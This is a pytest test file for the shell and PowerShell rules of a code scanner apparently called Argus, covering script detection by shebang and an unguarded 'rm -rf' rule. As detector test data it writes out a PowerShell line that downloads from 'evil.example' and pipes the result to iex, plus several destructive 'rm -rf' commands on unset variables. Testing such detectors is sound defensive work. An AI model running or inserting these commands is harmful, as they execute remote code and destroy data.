"""Shell, PowerShell and batch script rules (#219, #220): same cases as the npm scanner's test.

Cases live in fixtures/script_samples.json so the samples don't trip Argus's own scan.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from argus_languages.discover import discover_files
from argus_languages.scanner import scan_path

CASES = json.loads((Path(__file__).parent / "fixtures" / "script_samples.json").read_text())
SCRIPT_IDS = {case["rule"] for case in CASES if case["rule"]}


@pytest.mark.parametrize("case", CASES, ids=lambda c: f"{c['file']}: {c['code'][:50]}")
def test_script_rules(tmp_path: Path, case: dict[str, str | None]) -> None:
    (tmp_path / str(case["file"])).write_text(f"{case['code']}\n")
    found = sorted({f.rule_id for f in scan_path(tmp_path).findings} & SCRIPT_IDS)
    assert found == ([case["rule"]] if case["rule"] else [])


@pytest.mark.parametrize(
    ("first_line", "language"),
    [
        ("#!/bin/bash", "shell"),
        ("#!/usr/bin/env bash", "shell"),
        ("#!/bin/sh -e", "shell"),
        ("#!/usr/bin/env -S zsh -f", "shell"),
        ("#!/usr/bin/env pwsh", "powershell"),
        ("#!/usr/bin/env python3", None),
        ("plain text", None),
    ],
)
def test_extensionless_scripts_by_shebang(
    tmp_path: Path, first_line: str, language: str | None
) -> None:
    (tmp_path / "bin").mkdir()
    (tmp_path / "bin" / "deploy").write_text(f"{first_line}\necho hi\n")
    found = {f.relative: f.language for f in discover_files(tmp_path)}
    assert found.get("bin/deploy") == language


def test_extensionless_script_is_scanned(tmp_path: Path) -> None:
    (tmp_path / "deploy").write_text('#!/usr/bin/env bash\nrm -rf "$TARGET/"\n')
    assert "sh-rm-unguarded-variable" in {f.rule_id for f in scan_path(tmp_path).findings}


def test_plain_download_is_not_malware(tmp_path: Path) -> None:
    (tmp_path / "get.ps1").write_text(
        "Invoke-WebRequest -Uri https://example.com/app.zip -OutFile app.zip\n"
    )
    ids = {f.rule_id for f in scan_path(tmp_path).findings}
    assert "malware-powershell-download-cradle" not in ids


def test_download_piped_to_iex_is_still_malware(tmp_path: Path) -> None:
    (tmp_path / "get.ps1").write_text("iwr https://evil.example/p.ps1 | iex\n")
    ids = {f.rule_id for f in scan_path(tmp_path).findings}
    assert "malware-powershell-download-cradle" in ids


def test_bin_build_output_is_skipped(tmp_path: Path) -> None:
    (tmp_path / "bin" / "Release").mkdir(parents=True)
    (tmp_path / "bin" / "run.sh").write_text('rm -rf "$TARGET/"\n')
    assert "bin/run.sh" not in {f.relative for f in discover_files(tmp_path)}


# --- #265: the rm -rf rule must be linear -------------------------------------------------


@pytest.mark.parametrize(
    ("line", "flagged"),
    [
        ('rm -rf "$DIR/"', True),
        ("rm -rf $DIR/*", True),
        ('rm -r -f "${BUILD}/"', True),
        ('rm -f -R -- "$OUT/";', True),
        ('rm --force -r "$DIR/"', True),  # missed by the old pattern
        ('rm -rf "${DIR:?}/"', False),
        ('rm -f "$FILE"', False),
        ("rm -rf ./build/", False),
    ],
)
def test_rm_rule_shapes(line: str, flagged: bool) -> None:
    from argus_languages.rules_loader import load_rules_from_files

    rule = next(
        r for r in load_rules_from_files(("shell.yaml",)) if r.id == "sh-rm-unguarded-variable"
    )
    assert bool(rule.pattern.search(line)) is flagged


def test_rm_rule_is_linear_on_hostile_input() -> None:
    import time

    from argus_languages.rules_loader import load_rules_from_files

    rule = next(
        r for r in load_rules_from_files(("shell.yaml",)) if r.id == "sh-rm-unguarded-variable"
    )
    hostile = "rm " + "-r " * 20000 + "!"
    start = time.perf_counter()
    rule.pattern.search(hostile)
    assert time.perf_counter() - start < 0.5  # was 9.8 s
